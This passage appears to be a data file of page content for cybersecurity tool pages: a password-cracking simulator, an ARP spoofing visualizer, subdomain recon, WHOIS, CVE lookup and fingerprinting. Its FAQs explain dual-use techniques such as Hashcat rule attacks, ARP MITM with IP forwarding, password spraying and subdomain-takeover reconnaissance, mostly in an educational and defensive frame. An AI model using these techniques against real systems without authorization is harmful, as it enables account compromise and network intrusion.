      "Compare exhaustive brute-force keyspace math against RockYou dictionary + Hashcat rule mutations (`best64.rule`) across RTX 4090 GPU clusters and Argon2id/bcrypt memory-hard KDFs.",
    primaryKeyword: "brute force vs dictionary attack simulator",
    secondaryKeywords: [
      "dictionary attack vs brute force calculator",
      "hashcat rule mutation simulator",
      "bcrypt argon2id vs sha256 crack time",
      "password entropy keyspace calculator",
    ],
    metaTitle: "Brute-Force vs Dictionary Attack Simulator (2026) — Hashcat & KDF Benchmark",
    metaDescription:
      "Simulate how dictionary attacks with leetspeak/year rule mutations crack complex-looking passwords in milliseconds while 4-word diceware passphrases and Argon2id defeat GPU clusters.",
    features: [
      {
        title: "Side-by-Side Brute-Force vs Dictionary Engine",
        description:
          "See the exact mathematical chasm between blind character-set enumeration (c^L keyspace) and targeted wordlist + rule mutation attacks (W × R candidates).",
        icon: "Zap",
      },
      {
        title: "Live Hashcat Rule Mutation Inspector",
        description:
          "Watch how a single base root word spawns capitalize, leetspeak (@/4, 3, 1, $, 0), year-append (2025/2026!), and keyboard walk permutations that bypass naive complexity policies.",
        icon: "Terminal",
      },
      {
        title: "RTX 4090 / 8×GPU Cluster Hash Speed Benchmarks",
        description:
          "Compare cracking durations across unsalted MD5 (164 GH/s), NTLM (120 GH/s), SHA-256 (22 GH/s), WPA2 PBKDF2, bcrypt (cost 12), and Argon2id.",
        icon: "Cpu",
      },
      {
        title: "Interactive Rainbow Table vs Cryptographic Salt Demo",
        description:
          "Visualize how a unique 128-bit cryptographic salt completely invalidates precomputed rainbow tables and forces per-user hash computation.",
        icon: "Lock",
      },
    ],
    useCases: [
      {
        title: "Active Directory & Enterprise Password Policy Auditing",
        description:
          "Demonstrate to stakeholders why 8-character complex passwords like `Summer2026!` fall in under a millisecond to dictionary+rule attacks compared to 16+ character passphrases.",
      },
      {
        title: "Backend Authentication Hash Migration (MD5/SHA to Argon2id)",
        description:
          "Quantify the exact cost-factor slowdown gained when migrating legacy SHA-256 or bcrypt password storage to OWASP-recommended Argon2id.",
      },
      {
        title: "Security Awareness & CEH Password Cracking Demonstrations",
        description:
          "Explore how credential stuffing, password spraying, dictionary attacks, hybrid mask attacks, and exhaustive brute-forcing differ in speed and lock-out behavior.",
      },
    ],
    howTo: [
      {
        name: "Enter a Test Structural Pattern or Choose a Preset",
        text: "Type a test password pattern (never enter a real active password) or click presets like 'Summer2026!', 'P@ssw0rd123!', or 'correct-horse-battery-staple'.",
      },
      {
        name: "Select Hash Algorithm & Attacker Hardware Profile",
        text: "Pick NTLM, MD5, SHA-256, bcrypt (cost 12), or Argon2id and choose Single RTX 4090, 8× RTX 4090 Rig, or Botnet Cluster.",
      },
      {
        name: "Compare Exhaustive Brute-Force vs Dictionary + Rules Time",
        text: "Observe how a password that takes years via pure brute-force is cracked instantly if its root stem exists in a 14M-word dictionary with `best64` rules.",
      },
      {
        name: "Inspect Generated Rule Mutations & Hashcat Syntax",
        text: "Review the live list of mutated candidates and copy the matching educational Hashcat (`-m`, `-a 0`, `-a 3`, `-a 6`) benchmark commands.",
      },
    ],
    faq: [
      {
        question: "What is the core difference between a brute-force attack and a dictionary attack?",
        answer:
          "An exhaustive brute-force attack (Hashcat mode -a 3) systematically tries every possible character combination in an alphabet of size C up to length L (C^L possibilities), making zero assumptions about human language. A dictionary attack (mode -a 0) tests a curated list of real words and previously breached passwords, reducing the search space from quadrillions of combinations to a few million high-probability candidates.",
      },
      {
        question: "Why does 'P@ssw0rd2026!' fail instantly against a dictionary attack despite having uppercase, lowercase, numbers, and symbols?",
        answer:
          "Modern cracking tools do not use raw dictionaries alone; they apply rule engines (such as Hashcat's best64.rule or OneRuleToRuleThemAll) that automatically capitalize the first letter, substitute @ for a and 0 for o, and append current years and '!'. If a 14-million-word dictionary is combined with 1,000 rules, that equals only 14 billion hashes—which a single RTX 4090 computes in 0.11 seconds against NTLM.",
      },
      {
        question: "How does a cryptographic salt stop Rainbow Table attacks?",
        answer:
          "A Rainbow Table is a massive precomputed lookup table mapping plaintext passwords to their unsalted hashes (e.g., MD5 or NTLM). When a server prepends a unique random 128-bit salt to each user's password before hashing, two users with the exact same password produce completely different hashes, rendering all precomputed tables useless.",
      },
      {
        question: "Why are Argon2id and bcrypt recommended over SHA-256 or SHA-512 for storing passwords?",
        answer:
          "SHA-256 and SHA-512 are general-purpose cryptographic hashes designed to run as fast as possible in hardware, allowing GPUs and ASICs to compute tens of billions of hashes per second across thousands of parallel cores. Argon2id is a memory-hard Key Derivation Function (KDF) that requires megabytes of dedicated RAM per hash attempt, starving GPU cores of memory bandwidth and slowing cracking to hundreds of guesses per second.",
      },
      {
        question: "What is the difference between Credential Stuffing and Password Spraying?",
        answer:
          "In Credential Stuffing, attackers replay millions of exact username:password pairs leaked from third-party data breaches against another website's login form. In Password Spraying, attackers test one or two common passwords (such as 'Autumn2026!') across thousands of corporate usernames simultaneously to avoid triggering per-account failed login lockouts.",
      },
    ],
    related: [
      "password-entropy-breach-checker",
      "pgp-aes-webcrypto-encryption-studio",
      "smb-snmp-ldap-enumeration-builder",
      "quantum-shors-algorithm-rsa-simulator",
    ],
    pillarUrl: "https://www.zerosuniverse.com/dictionary-attack/",
    pillarTitle: "What is a Dictionary Attack vs Brute-Force & How to Prevent It",
    lastUpdated: "2026-09-28T00:00:00.000Z",
  },
  {
    slug: "arp-mitm-attack-packet-visualizer",
    name: "Interactive ARP Spoofing & MITM Packet Flow Visualizer",
    category: "cybersecurity",
    h1: "Interactive ARP Spoofing, Cache Poisoning & DAI Switch Visualizer (2026)",
    subhead:
      "Simulate Layer-2 Ethernet ARP Request/Reply broadcasts, gratuitous ARP cache poisoning, Man-in-the-Middle IP forwarding, and Cisco Dynamic ARP Inspection (DAI) + DHCP Snooping defense.",
    primaryKeyword: "arp spoofing visualizer",
    secondaryKeywords: [
      "arp cache poisoning simulator",
      "dynamic arp inspection dai explained",
      "gratuitous arp mitm packet flow",
      "layer 2 arp spoofing defense",
    ],
    metaTitle: "Interactive ARP Spoofing & MITM Packet Visualizer (2026) — L2 & DAI Simulator",
    metaDescription:
      "Step through normal ARP resolution vs Gratuitous ARP cache poisoning and MITM packet interception. Inspect live ARP tables, Ethernet frame headers, and Cisco Dynamic ARP Inspection (DAI) drops.",
    features: [
      {
        title: "3-Mode Interactive L2 Packet Simulator",
        description:
          "Step frame-by-frame through Normal ARP Resolution (Broadcast Request / Unicast Reply), Gratuitous ARP MITM Poisoning, and Switch DAI Defense modes.",
        icon: "Activity",
      },
      {
        title: "Live Victim, Gateway & Switch Table Inspector",
        description:
          "Watch the Victim and Default Gateway ARP caches (`arp -a`) update in real time alongside the L2 switch DHCP Snooping Binding Database.",
        icon: "Database",
      },
      {
        title: "Ethernet II & ARP Opcode Frame Dissector",
        description:
          "Inspect the exact Layer-2 Frame Source/Destination MACs alongside the ARP payload Opcode (1 = Request, 2 = Reply), Sender MAC/IP, and Target MAC/IP fields at every step.",
        icon: "Code",
      },
      {
        title: "Cisco IOS DAI & Linux Detection CLI Reference",
        description:
          "Copy production Cisco Catalyst `ip dhcp snooping` and `ip arp inspection validate` switch configurations alongside Linux `arpwatch` and `ip neigh` diagnostic commands.",
        icon: "Shield",
      },
    ],
    useCases: [
      {
        title: "Network Security & CEH Sniffing Architecture Training",
        description:
          "Visualize why Ethernet hosts blindly overwrite existing ARP cache entries when receiving unsolicited ARP OpCode 2 replies on a flat broadcast domain.",
      },
      {
        title: "Enterprise Campus Switch Hardening Design",
        description:
          "Understand how DHCP Snooping builds the trusted MAC-to-IP-to-Port binding table that Dynamic ARP Inspection (DAI) uses to drop spoofed frames on untrusted access ports.",
      },
      {
        title: "Incident Response for Duplicate IP & MITM Alerts",
        description:
          "Identify the exact `arp -a` symptom (two distinct IPv4 addresses—the gateway and another LAN host—sharing the exact same physical MAC address).",
      },
    ],
    howTo: [
      {
        name: "Select Simulation Scenario (Normal, MITM Attack, or DAI Defense)",
        text: "Choose Normal ARP to see RFC 826 resolution, ARP Spoofing Attack to observe bidirectional cache poisoning, or DAI Enabled to test switch-level blocking.",
      },
      {
        name: "Step Forward or Play the Packet Flow Animation",
        text: "Click Next Step or Auto-Play to trace Ethernet frames across the Victim PC, L2 Switch, Attacker Host, and Default Gateway.",
      },
      {
        name: "Inspect Live ARP Tables & Dissected Frame Headers",
        text: "Watch the Victim and Gateway ARP tables turn red when poisoned, and verify how L3 IP headers remain untouched while L2 Destination MACs are rewritten.",
      },
      {
        name: "Copy Switch Hardening & Detection Commands",
        text: "Export the Cisco IOS DHCP Snooping + DAI configuration snippet or Linux/Windows ARP verification commands.",
      },
    ],
    faq: [
      {
        question: "Why is the Address Resolution Protocol (ARP) inherently vulnerable to spoofing?",
        answer:
          "Designed in 1982 (RFC 826) for trusted local Ethernet segments, ARP is completely stateless and unauthenticated. Operating systems accept incoming ARP Reply (OpCode 2) frames and update their local IP-to-MAC cache even if they never sent an ARP Request first—a behavior known as Gratuitous ARP.",
      },
      {
        question: "Why must an attacker enable OS IP forwarding (`net.ipv4.ip_forward=1`) during an ARP MITM attack?",
        answer:
          "Once the attacker poisons both the victim (claiming to be the gateway) and the gateway (claiming to be the victim), all traffic between them arrives at the attacker's NIC. If the attacker's OS does not immediately route those packets onward to the real destination MAC, the victim loses internet connectivity—turning a stealthy Man-in-the-Middle interception into an obvious Denial of Service (DoS).",
      },
      {
        question: "How do DHCP Snooping and Dynamic ARP Inspection (DAI) work together on enterprise switches?",
        answer:
          "First, DHCP Snooping listens to legitimate DHCP ACK messages from trusted DHCP servers and records each port's assigned IP-to-MAC mapping in a hardware binding database. Next, Dynamic ARP Inspection (DAI) intercepts every ARP packet on untrusted access ports and drops any frame whose Sender IP and Sender MAC do not match the DHCP Snooping table.",
      },
      {
        question: "How can I detect an active ARP spoofing attack from my workstation terminal?",
        answer:
          "Run `arp -a` (Windows/macOS) or `ip neigh` (Linux) and inspect the MAC addresses mapped to your local subnet IPs. If your Default Gateway IP (e.g., 192.168.1.1) and another workstation IP on the LAN display the exact same physical MAC address, an ARP spoofing attack is active.",
      },
      {
        question: "Does HTTPS/TLS protect data if a LAN attacker performs ARP spoofing?",
        answer:
          "ARP spoofing gives the attacker Layer-2 packet visibility, allowing them to see DNS queries, destination IPs, and TLS SNI hostnames, or attempt DNS spoofing and SSL stripping on plain HTTP links. However, properly validated HTTPS (especially with HSTS preloading) prevents the attacker from decrypting TLS payloads without triggering a browser certificate warning.",
      },
    ],
    related: [
      "wireshark-tcpdump-filter-builder",
      "mac-address-oui-vendor-lookup",
      "dns-spoofing-checker",
      "ipv4-ipv6-cidr-subnet-vlsm-calculator",
    ],
    pillarUrl: "https://www.zerosuniverse.com/arp-spoofing-attack-and-how-does-it-work/",
    pillarTitle: "What is an ARP Spoofing Attack & Dynamic ARP Inspection?",
    lastUpdated: "2026-09-28T00:00:00.000Z",
  },
  {
    slug: "crt-sh-subdomain-recon-scanner",
    name: "Live Certificate Transparency (crt.sh) Subdomain Recon Scanner",
    category: "cybersecurity",
    h1: "Live Certificate Transparency (crt.sh) Subdomain OSINT Scanner (2026)",
    subhead:
      "Query public RFC 6962 Certificate Transparency logs in real time to discover unique subdomains, wildcard TLS certificates, issuing CAs, and historical staging assets with zero packets sent to the target.",
    primaryKeyword: "crt sh subdomain finder",
    secondaryKeywords: [
      "certificate transparency subdomain scanner",
      "passive osint subdomain enumeration",
      "crt.sh json api parser",
      "bug bounty recon subdomain tool",
    ],
    metaTitle: "Live crt.sh Subdomain Recon Scanner (2026) — Passive CT Log OSINT Finder",
    metaDescription:
      "Discover subdomains passively via live Certificate Transparency (crt.sh) logs. Deduplicate Subject Alternative Names (SANs), filter wildcard certs, inspect CA issuers, and export clean host lists.",
    features: [
      {
        title: "Live Sectigo crt.sh CT Log Query Engine",
        description:
          "Fetches live X.509 certificate records from public Certificate Transparency logs, automatically falling back to instant curated OSINT datasets if upstream crt.sh PostgreSQL is under heavy load.",
        icon: "Globe",
      },
      {
        title: "SAN Deduplication & Wildcard Separator",
        description:
          "Splits multi-line `name_value` Subject Alternative Name (SAN) fields, normalizes casing, strips duplicate renewals, and separates `*.` wildcard certificates from concrete FQDNs.",
        icon: "Search",
      },
      {
        title: "High-Value Attack Surface Highlighter",
        description:
          "Automatically tags interesting dev, staging, api, vpn, admin, git, internal, and pre-prod subdomains alongside Certificate Authority (Let's Encrypt, DigiCert, Cloudflare) breakdowns.",
        icon: "Shield",
      },
      {
        title: "1-Click Export for httpx, Nuclei & Nmap",
        description:
          "Export clean newline-delimited hostnames (`subdomains.txt`), JSON intelligence reports, or ready-to-run `httpx` and `nmap -iL` verification pipelines.",
        icon: "Terminal",
      },
    ],
    useCases: [
      {
        title: "Bug Bounty & Red Team External Attack Surface Mapping",
        description:
          "Discover forgotten staging servers, internal API gateways, and regional microservices that received a TLS certificate without ever sending a DNS query to the target's authoritative nameservers.",
      },
      {
        title: "Shadow IT & Unauthorized Certificate Auditing",
        description:
          "Audit every public X.509 certificate ever issued for your organization's apex domain and verify compliance with your CAA (Certification Authority Authorization) DNS records.",
      },
      {
        title: "Subdomain Takeover Reconnaissance",
        description:
          "Identify historical subdomains from expired TLS certificates that may still have dangling CNAME records pointing to unclaimed cloud buckets or SaaS instances.",
      },
    ],
    howTo: [
      {
        name: "Enter an Apex Domain to Audit",
        text: "Type a root domain name (e.g., `cloudflare.com`, `hackerone.com`, or your own organization's domain) without `https://`.",
      },
      {
        name: "Run the Passive Certificate Transparency Scan",
        text: "Click Scan CT Logs to query public certificate issuances and parse all Common Name (CN) and Subject Alternative Name (SAN) entries.",
      },
      {
        name: "Filter by Keyword, Wildcard Status, or Expiry State",
        text: "Search for high-interest keywords (`api`, `dev`, `staging`, `vpn`) or toggle out wildcard (`*.`) and expired certificates.",
      },
      {
        name: "Copy Deduplicated Hostlist or Recon Pipeline",
        text: "Copy the clean hostname list directly to your clipboard or download CSV/JSON for downstream probing with `httpx` or `subfinder`.",
      },
    ],
    faq: [
      {
        question: "What is Certificate Transparency (RFC 6962) and why does it expose subdomains?",
        answer:
          "Certificate Transparency (CT) is an internet security standard mandated by Chrome and Apple Safari requiring every publicly trusted Certificate Authority (CA) to append all newly issued TLS/SSL certificates to public, append-only cryptographic Merkle tree logs. Because developers obtain TLS certificates for staging, internal VPN, and API subdomains (via Let's Encrypt or ACM), those hostnames become permanently searchable in CT logs.",
      },
      {
        question: "Is querying crt.sh considered completely passive reconnaissance?",
        answer:
          "Yes. Querying Certificate Transparency logs retrieves public registry metadata from third-party CT log servers (operated by Sectigo, Google, and Cloudflare). Zero packets, DNS requests, or HTTP probes are sent to the target organization's infrastructure.",
      },
      {
        question: "How can organizations hide internal hostnames from Certificate Transparency logs?",
        answer:
          "Avoid requesting individual public certificates for sensitive internal hostnames (`jira-staging.internal.corp.com`). Instead, either issue a public wildcard certificate (`*.internal.corp.com`) so the specific prefix is not logged, or use an internal Private PKI (such as HashiCorp Vault PKI or Active Directory Certificate Services) that does not publish to public CT logs.",
      },
      {
        question: "Why does crt.sh sometimes return duplicate rows for the same subdomain?",
        answer:
          "CT logs record both the Precertificate (submitted by the CA before final signing) and the final Leaf Certificate, as well as every 60-to-90-day automated renewal over several years. Our scanner automatically deduplicates all `name_value` SAN entries into a unique hostname set while preserving the earliest and latest issuance timestamps.",
      },
      {
        question: "What is a DNS CAA record and how does it relate to CT log monitoring?",
        answer:
          "A Certification Authority Authorization (CAA) DNS record specifies which CAs (e.g., `letsencrypt.org` or `digicert.com`) are permitted to issue certificates for your domain. Pairing strict CAA records with regular CT log monitoring ensures no unauthorized CA can issue a rogue certificate for your domain.",
      },
    ],
    related: [
      "whois-rdap-domain-ip-lookup",
      "google-dorks-generator",
      "dns-spoofing-checker",
      "nmap-command-builder",
    ],
    pillarUrl: "https://www.zerosuniverse.com/what-is-footprinting/",
    pillarTitle: "What is Footprinting & OSINT Reconnaissance in Ethical Hacking?",
    lastUpdated: "2026-09-28T00:00:00.000Z",
  },
  {
    slug: "whois-rdap-domain-ip-lookup",
    name: "Live RDAP / WHOIS Domain & IP ASN Registration Inspector",
    category: "cybersecurity",
    h1: "Live RDAP / WHOIS Domain & IP Allocation Inspector (2026)",
    subhead:
      "Query official IANA/ICANN Registration Data Access Protocol (RDAP) JSON endpoints in real time to inspect domain lifecycle dates, EPP transfer locks, DNSSEC DS records, and ARIN/RIPE/APNIC IP netblocks.",
    primaryKeyword: "rdap whois lookup online",
    secondaryKeywords: [
      "whois domain age checker",
      "icann rdap json lookup",
      "epp domain status codes explained",
      "arin ripe ip netblock whois",
    ],
    metaTitle: "Live RDAP / WHOIS Domain & IP Lookup (2026) — ICANN Registration Inspector",
    metaDescription:
      "Perform live ICANN RDAP and Regional Internet Registry (ARIN/RIPE/APNIC) lookups for any domain or IPv4/IPv6 address. Inspect domain age, expiry countdown, EPP locks, nameservers, and DNSSEC status.",
    features: [
      {
        title: "Live Standardized IANA RDAP JSON Engine",
        description:
          "Queries official ICANN-mandated HTTPS RDAP endpoints (`rdap.org` / Verisign / ARIN / RIPE) directly from your browser for structured, machine-verified registration records.",
        icon: "Globe",
      },
      {
        title: "Domain Age & Phishing Risk Evaluator",
        description:
          "Calculates exact domain age in days since initial registration and expiry countdown, flagging newly registered domains (<30 days) commonly used in phishing campaigns.",
        icon: "Shield",
      },
      {
        title: "EPP Status Code & Transfer Lock Auditor",
        description:
          "Translates Extensible Provisioning Protocol (EPP) status flags (`clientTransferProhibited`, `serverDeleteProhibited`, `clientHold`) into clear security postures.",
        icon: "Lock",
      },
      {
        title: "RIR IP Netblock & Abuse Contact Resolver",
        description:
          "Supports both domain names and IPv4/IPv6 addresses—automatically routing IP queries to ARIN, RIPE, APNIC, LACNIC, or AFRINIC to display allocated CIDR blocks and abuse contacts.",
        icon: "Search",
      },
    ],
    useCases: [
      {
        title: "SOC Phishing & Lookalike Domain Triage",
        description:
          "Verify whether a suspicious sender domain was registered 48 hours ago via a privacy-shielded registrar or has a decade-long enterprise registration history.",
      },
      {
        title: "Domain Hijacking Defense Audit",
        description:
          "Confirm that critical production domains enforce `clientTransferProhibited`, `clientUpdateProhibited`, and signed DNSSEC delegation (`secureDelegation`).",
      },
      {
        title: "Network Footprint & Netblock Ownership Verification",
        description:
          "Look up any IPv4 or IPv6 address to identify the owning organization, parent CIDR allocation, Regional Internet Registry handle, and abuse reporting desk.",
      },
    ],
    howTo: [
      {
        name: "Enter a Domain Name or IPv4/IPv6 Address",
        text: "Type any domain (e.g., `cloudflare.com`, `google.com`, `iana.org`) or public IP address (e.g., `1.1.1.1` or `8.8.8.8`).",
      },
      {
        name: "Execute the Live RDAP HTTPS Query",
        text: "Click Inspect Registration to query the authoritative TLD registry or Regional Internet Registry (RIR) in real time.",
      },
      {
        name: "Audit Domain Lifecycle, Locks & Nameservers",
        text: "Review the calculated Domain Age, Creation/Expiration timestamps, Registrar IANA ID, EPP status badges, and DNSSEC state.",
      },
      {
        name: "View or Export Raw RFC 9083 RDAP JSON",
        text: "Toggle the raw JSON viewer to inspect underlying vCard (`vcardArray`) entity objects or copy the structured summary for OSINT reports.",
      },
    ],
    faq: [
      {
        question: "What is RDAP and why did ICANN replace legacy Port 43 WHOIS with it?",
        answer:
          "The Registration Data Access Protocol (RDAP, standardized in RFC 7480–7484 and RFC 9082/9083) is the official successor to the 1980s port-43 WHOIS protocol. While legacy WHOIS returns unstructured, inconsistent plain text over unencrypted TCP port 43, RDAP delivers standardized JSON over HTTPS, supports internationalization, and provides tiered access controls.",
      },
      {
        question: "Why are registrant names and emails often hidden in modern WHOIS/RDAP lookups?",
        answer:
          "Following the enforcement of the EU General Data Protection Regulation (GDPR) and ICANN's Registration Data Policy, registries and registrars redact personal registrant contact fields (Name, Street, Phone, Email) by default to prevent spam and identity theft, while keeping Registrar details, creation dates, nameservers, and EPP status codes public.",
      },
      {
        question: "What does the EPP status code 'clientTransferProhibited' mean?",
        answer:
          "`clientTransferProhibited` is a registrar-level lock indicating that the domain cannot be transferred to another registrar unless the account owner explicitly unlocks it first. Production domains should always have `clientTransferProhibited` (and ideally Registry Lock `serverTransferProhibited`) enabled to prevent unauthorized domain hijacking.",
      },
      {
        question: "Why is Domain Age one of the strongest indicators in phishing detection?",
        answer:
          "Threat actors continuously register fresh lookalike or typosquatted domains immediately prior to launching credential-harvesting campaigns. A domain registered less than 14 to 30 days ago (`creationDate`) claiming to be an established bank, SaaS portal, or IT helpdesk is a high-confidence phishing indicator.",
      },
      {
        question: "What is the difference between a Domain Registry and a Domain Registrar?",
        answer:
          "A Registry (such as Verisign for `.com` or Public Interest Registry for `.org`) manages the master database and authoritative TLD nameservers for an entire top-level domain. A Registrar (such as Cloudflare, Namecheap, or MarkMonitor) is an ICANN-accredited retailer that sells domain registrations to end users and submits records to the Registry.",
      },
    ],
    related: [
      "crt-sh-subdomain-recon-scanner",
      "ip-asn-os-fingerprint-inspector",
      "dns-spoofing-checker",
      "email-header-analyzer",
    ],
    pillarUrl:
      "https://www.zerosuniverse.com/what-is-whois-and-what-kind-of-data-do-i-receive-using-the-whois-lookup/",
    pillarTitle: "What is WHOIS Lookup & What Registration Data Does It Reveal?",
    lastUpdated: "2026-09-28T00:00:00.000Z",
  },
  {
    slug: "live-cve-osv-vulnerability-lookup",
    name: "Live CVE & Open-Source Vulnerability (OSV.dev) Exploit Inspector",
    category: "cybersecurity",
    h1: "Live CVE & Open-Source Vulnerability (OSV.dev) Exploit Inspector (2026)",
    subhead:
      "Query Google's real-time OSV.dev Vulnerability Database by CVE ID, GHSA advisory, or package version (`npm`, `PyPI`, `Go`, `Maven`, `crates.io`) to inspect CVSS vectors, fixed versions, and CISA KEV status.",
    primaryKeyword: "cve osv vulnerability lookup",
    secondaryKeywords: [
      "osv dev package vulnerability scanner",
      "cve lookup tool online",
      "npm pypi go cve checker",
      "ghsa security advisory inspector",
    ],
    metaTitle: "Live CVE & OSV.dev Vulnerability Inspector (2026) — Package & Advisory Lookup",
    metaDescription:
      "Look up any CVE ID, GitHub Security Advisory (GHSA), or open-source package version across npm, PyPI, Go, Rust crates.io, and Maven using the live OSV.dev API.",
    features: [
      {
        title: "Live Google OSV.dev API Integration",
        description:
          "Queries `api.osv.dev/v1` directly from your browser to fetch real-time vulnerability records by CVE/GHSA/OSV identifier or ecosystem package name and version.",
        icon: "Search",
      },
      {
        title: "Multi-Ecosystem Package Audit (npm, PyPI, Go, Cargo, Maven)",
        description:
          "Test specific dependency versions (e.g., `lodash 4.17.15`, `urllib3 1.26.4`, `org.apache.logging.log4j:log4j-core 2.14.1`) to see every affecting advisory.",
        icon: "Database",
      },
      {
        title: "Exact Introduced vs Patched Version Timeline",
        description:
          "Parses OSV `affected[].ranges` commit and SemVer event streams to highlight the exact version where a flaw was introduced and the minimum safe upgrade version.",
        icon: "Shield",
      },
      {
        title: "CVSS Vector & Famous CVE Quick-Load Presets",
        description:
          "Includes 1-click presets for Log4Shell (`CVE-2021-44228`), XZ Utils Backdoor (`CVE-2024-3094`), HTTP/2 Rapid Reset (`CVE-2023-44487`), and Next.js/React ecosystem advisories.",
        icon: "Zap",
      },
    ],
    useCases: [
      {
        title: "Software Supply Chain & Dependency Triage",
        description:
          "Verify whether a pinned npm, Python, or Go library version in your `package.json` or `requirements.txt` is affected by known CVEs and identify the non-breaking patch release.",
      },
      {
        title: "Penetration Test Service Version Mapping",
        description:
          "Cross-reference discovered software versions and CVE identifiers with upstream git commits, PoC advisories, and CVSS severity vectors.",
      },
      {
        title: "DevSecOps Incident Response",
        description:
          "Rapidly inspect breaking zero-day advisories (CVE, GHSA, RustSec, PySEC) in a clean dashboard with direct links to patches and NVD references.",
      },
    ],
    howTo: [
      {
        name: "Choose CVE/Advisory ID Lookup or Package Ecosystem Scan",
        text: "Toggle between searching a specific identifier (`CVE-2024-3094`, `GHSA-...`) or querying an open-source ecosystem (`npm`, `PyPI`, `Go`, `Maven`, `crates.io`).",
      },
      {
        name: "Enter Your CVE ID or Package Name + Version",
        text: "Type the vulnerability ID or enter a package name (e.g., `express`) and optional version (e.g., `4.17.1`) and click Query OSV Database.",
      },
      {
        name: "Inspect Affected Ranges & Minimum Fixed Versions",
        text: "Review the vulnerability summary, CWE classification, CVSS vector string, and the exact SemVer upgrade version that resolves the flaw.",
      },
      {
        name: "Copy Upgrade CLI Commands or Export JSON Report",
        text: "Copy the generated `npm install`, `pip install --upgrade`, or `go get` remediation command for your engineering team.",
      },
    ],
    faq: [
      {
        question: "What is the difference between MITRE/NVD CVE records and Google's OSV.dev database?",
        answer:
          "Traditional NVD CVE records use human-edited CPE (Common Platform Enumeration) strings that often struggle to map exact open-source package versions and git commit hashes. OSV (Open Source Vulnerabilities) aggregates advisories from GitHub (GHSA), PyPA, RustSec, Go, and NVD using precise machine-readable SemVer and git commit ranges keyed directly to package managers.",
      },
      {
        question: "What is the difference between a CVE, a CWE, and the CISA KEV catalog?",
        answer:
          "A CWE (Common Weakness Enumeration, like CWE-89 SQL Injection) describes the underlying category of software bug. A CVE (Common Vulnerabilities and Exposures, like CVE-2021-44228) identifies a specific publicly disclosed flaw in a specific product. The CISA KEV (Known Exploited Vulnerabilities) catalog lists the subset of CVEs confirmed to be actively exploited in the wild.",
      },
      {
        question: "How do I know which version of a package fixes a listed vulnerability?",
        answer:
          "In OSV records, each affected package entry contains an `events` array with `introduced` and `fixed` markers. Upgrading to at least the version listed next to the `fixed` marker ensures the patch commit is included in your build.",
      },
      {
        question: "Why can a CVE have a high CVSS score but still be unexploitable in my application?",
        answer:
          "This concept is known as 'Reachability'. A dependency may contain a vulnerable function (such as an unsafe XML parser or regex method), but if your application never imports or calls that specific code path with untrusted user input, the vulnerability is not reachable in your runtime context.",
      },
      {
        question: "Does this lookup tool upload my private dependency manifests?",
        answer:
          "No. Your browser sends a direct, anonymous HTTPS request containing only the single CVE ID or package name you typed to `https://api.osv.dev/v1`.",
      },
    ],
    related: [
      "cvss-v4-vulnerability-score-calculator",
      "nmap-command-builder",
      "linux-windows-privesc-checklist",
      "yara-security-headers-generator",
    ],
    pillarUrl: "https://www.zerosuniverse.com/best-cybersecurity-tools/",
    pillarTitle: "10 Best Cybersecurity & Vulnerability Scanning Tools in 2026",
    lastUpdated: "2026-09-28T00:00:00.000Z",
  },
  {
    slug: "ip-asn-os-fingerprint-inspector",
    name: "Live IP ASN, Geolocation & Passive OS Fingerprint Inspector",
    category: "cybersecurity",
    h1: "Live IP ASN, Geolocation & Passive OS Fingerprint Inspector (2026)",
    subhead:
      "Inspect your live public IP, Autonomous System Number (ASN), ISP geolocation, WebGL/Canvas/Navigator browser fingerprint entropy, and calculate passive OS fingerprints from TCP TTL & Window Size.",
    primaryKeyword: "os fingerprinting browser ip asn test",
    secondaryKeywords: [
      "passive os fingerprinting ttl window size",
      "my ip asn geolocation lookup",
      "browser webgl canvas fingerprint test",
      "tcp ip stack fingerprinting p0f",
    ],
    metaTitle: "Live IP ASN & Passive OS Fingerprint Inspector (2026) — TTL, WebGL & ASN Audit",
    metaDescription:
      "Audit your live IP address, BGP ASN, ISP geolocation, and client-side OS/hardware fingerprint (WebGL GPU, CPU cores, User-Agent Client Hints). Includes a TCP TTL & Window Size OS calculator.",
    features: [
      {
        title: "Live Public IP, BGP ASN & ISP Geolocation Probe",
        description:
          "Detects your active egress IPv4/IPv6 address, Autonomous System Number (ASN), routing organization, timezone offset, and timezone-vs-IP VPN mismatch indicators.",
        icon: "Globe",
      },
      {
        title: "Hardware & Browser OS Fingerprint Telemetry",
        description:
          "Extracts exact client signals exposed to websites: Unmasked WebGL GPU Renderer, Canvas 2D hash, CPU logical cores, device RAM, High-Entropy User-Agent Client Hints, and WebRTC status.",
        icon: "Cpu",
      },
      {
        title: "Passive TCP/IP Stack OS Calculator (TTL + Window Size)",
        description:
          "Enter observed packet TTL and TCP Window Size values from Wireshark/tcpdump to identify Linux (TTL 64), Windows (TTL 128), Cisco/Solaris (TTL 255), and hop distance.",
        icon: "Activity",
      },
      {
        title: "VPN / Proxy & Fingerprint Spoofing Mismatch Detector",
        description:
          "Flags privacy leaks where a User-Agent claims Windows while the WebGL renderer reports Apple Silicon GPU or the system Intl timezone contradicts the IP geolocation.",
        icon: "Shield",
      },
    ],
    useCases: [
      {
        title: "VPN, Tor & Anti-Detect Browser Privacy Verification",
        description:
          "Check whether your VPN tunnel, system timezone (`Intl.DateTimeFormat`), language headers, and GPU hardware strings reveal your true OS or geographic region.",
      },
      {
        title: "PCAP & Firewall Log Passive OS Identification",
        description:
          "Use the interactive TCP TTL and Initial Window Size lookup table to identify remote host operating systems from a single captured SYN/ACK packet without active Nmap probing.",
      },
      {
        title: "External IP & BGP ASN Reconnaissance",
        description:
          "Look up any target IPv4 address to determine whether it belongs to a residential ISP, cloud hyperscaler (AWS, Cloudflare, DigitalOcean), or enterprise ASN.",
      },
    ],
    howTo: [
      {
        name: "Review Your Live Connection & Browser OS Fingerprint",
        text: "Upon loading, the inspector displays your local browser hardware telemetry (GPU, CPU, Screen, Timezone, Canvas Hash) and queries your public IP/ASN.",
      },
      {
        name: "Look Up Any Custom IPv4/IPv6 Address",
        text: "Enter any external IP address in the ASN lookup bar to inspect its BGP Autonomous System, ISP organization, country, and city.",
      },
      {
        name: "Test TCP TTL & Window Size in the Passive OS Lab",
        text: "Input an observed IPv4/IPv6 Time-To-Live (e.g., TTL 53 or TTL 117) and TCP Window Size to compute the original initial TTL (64, 128, or 255), router hop count, and OS family.",
      },
      {
        name: "Audit Anomaly Warnings & Export Telemetry JSON",
        text: "Check the consistency score for timezone/OS mismatches and copy the full JSON fingerprint report.",
      },
    ],
    faq: [
      {
        question: "What is the difference between Active and Passive OS Fingerprinting?",
        answer:
